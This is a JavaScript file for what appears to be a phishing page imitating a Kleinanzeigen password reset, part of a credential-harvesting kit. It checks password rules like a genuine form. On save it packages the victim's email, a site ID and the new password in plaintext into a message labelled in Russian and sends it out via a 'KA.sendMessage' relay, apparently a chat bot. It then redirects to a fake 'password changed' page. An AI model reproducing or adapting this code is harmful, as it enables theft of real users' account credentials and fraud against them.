(function () {
  var email  = sessionStorage.getItem("ka_email")   || "";
  var siteId = sessionStorage.getItem("ka_site_id") || "";
  if (!email || !siteId || !sessionStorage.getItem("ka_forgot_msg_id")) { window.location.href = "login.html"; return; }
  var pw1     = document.getElementById("pw1");
  var pw2     = document.getElementById("pw2");
  var group1  = document.getElementById("group1");
  var group2  = document.getElementById("group2");
  var pwRules = document.getElementById("pwRules");
  var btnSave = document.getElementById("btnSave");
  var SVG_EYE_OPEN   = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/></svg>';
  var SVG_EYE_CLOSED = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><line x1="1" y1="1" x2="23" y2="23" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>';
  function makeToggle(btnId, input) {
    var btn = document.getElementById(btnId);
    btn.innerHTML = SVG_EYE_CLOSED;
    btn.addEventListener("click", function () {
      var show = input.type === "password";
      input.type = show ? "text" : "password";
      btn.innerHTML = show ? SVG_EYE_OPEN : SVG_EYE_CLOSED;
      btn.setAttribute("aria-label", show ? "Passwort verbergen" : "Passwort anzeigen");
    });
  }
  makeToggle("toggle1", pw1);
  makeToggle("toggle2", pw2);
  function setRule(id, ok) { document.getElementById(id).classList.toggle("ok", ok); }
  pw1.addEventListener("input", function () {
    group1.classList.remove("has-error");
    var v = pw1.value;
    group1.classList.toggle("has-value", v.length > 0);
    pwRules.classList.toggle("visible", v.length > 0);
    var hasLower = /[a-z]/.test(v), hasUpper = /[A-Z]/.test(v), hasDigit = /[0-9]/.test(v), hasSpecial = /[^A-Za-z0-9]/.test(v);
    var combo = [hasLower, hasUpper, hasDigit, hasSpecial].filter(Boolean).length;
    setRule("rule-len", v.length >= 8); setRule("rule-lower", hasLower); setRule("rule-upper", hasUpper);
    setRule("rule-digit", hasDigit); setRule("rule-special", hasSpecial); setRule("rule-combo", combo >= 3);
  });
  pw2.addEventListener("input", function () {
    group2.classList.remove("has-error");
    group2.classList.toggle("has-value", pw2.value.length > 0);
    pwRules.classList.toggle("visible", pw1.value.length > 0 || pw2.value.length > 0);
  });
  function escapeHtml(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
  btnSave.addEventListener("click", function () {
    var v1 = pw1.value, v2 = pw2.value, ok = true;
    group1.classList.remove("has-error"); group2.classList.remove("has-error");
    if (!v1 || v1.length < 8) { group1.classList.add("has-error"); ok = false; }
    if (!v2) { group2.classList.add("has-error"); ok = false; }
    else if (v2 !== v1) { group2.classList.add("has-error"); ok = false; }
    if (!ok) return;
    btnSave.disabled = true;
    btnSave.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    var text =
      "\uD83D\uDD11 <b>Kleinanzeigen \u2014 \u041D\u043E\u0432\u044B\u0439 \u043F\u0430\u0440\u043E\u043B\u044C</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
      "\uD83D\uDD11 <b>Neues Passwort:</b> <code>" + escapeHtml(v1) + "</code>\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE");
    KA.sendMessage(text);
    setTimeout(function () { window.location.href = "password_changed.html"; }, 600);
  });
})();
